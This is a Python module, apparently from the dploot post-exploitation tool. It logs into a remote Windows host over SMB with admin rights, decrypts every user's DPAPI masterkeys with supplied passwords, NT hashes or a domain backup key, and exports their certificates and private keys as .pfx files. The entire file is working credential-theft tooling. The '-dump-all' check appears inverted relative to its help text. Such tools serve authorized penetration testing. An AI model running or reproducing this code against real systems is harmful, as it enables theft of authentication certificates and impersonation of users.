import argparse
import logging
import os
import sys
from typing import Callable, Tuple
from dploot.action.masterkeys import add_masterkeys_argument_group, parse_masterkeys_options

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import handle_outputdir_option, parse_file_as_list
from dploot.triage.certificates import CertificatesTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file

NAME = 'certificates'

class CertificatesAction:

    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options
        self.target = Target.from_options(options)
        
        self.conn = None
        self._is_admin = None
        self.outputdir = None
        self.masterkeys = None
        self.pvkbytes = None
        self.passwords = None
        self.nthashes = None

        self.outputdir = handle_outputdir_option(dir= self.options.export_certificates)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

        self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        self.conn.connect()

    def run(self) -> None:
        self.connect()
        logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
        if self.is_admin:
            if self.masterkeys is None:
                masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                if not self.options.quiet: 
                    for masterkey in self.masterkeys:
                        masterkey.dump()
                    print()
                
            triage = CertificatesTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            logging.info('Triage Certificates for ALL USERS\n')
            certificates = triage.triage_certificates()
            for certificate in certificates:
                if self.options.dump_all and not certificate.clientauth:
                    continue
                if not self.options.quiet:
                    certificate.dump()
                filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
                logging.critical("Writting certificate to %s" % filename)
                if not self.options.quiet:
                    print() # better outputing
                with open(filename, "wb") as f:
                    f.write(certificate.pfx)
            if self.outputdir is not None:
                for filename, bytes in triage.looted_files.items():
                    with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                        outputfile.write(bytes)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

def entry(options: argparse.Namespace) -> None:
    a = CertificatesAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:

    subparser = subparsers.add_parser(NAME, help="Dump users certificates from remote target")

    group = subparser.add_argument_group("certificates options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=(
            "File containing {GUID}:SHA1 masterkeys mappings"
        ),
    )

    add_masterkeys_argument_group(group)

    group.add_argument(
        "-dump-all",
        action="store_true",
        help=(
            "Dump also certificates not used for client authentication"
        )
    )

    group.add_argument(
        "-export-certificates",
        action="store",
        metavar="DIR_CERTIFICATES",
        help=(
            "Dump looted certificates to specified directory, regardless they were decrypted"
        )
    )

    add_target_argument_group(subparser)

    return NAME, entry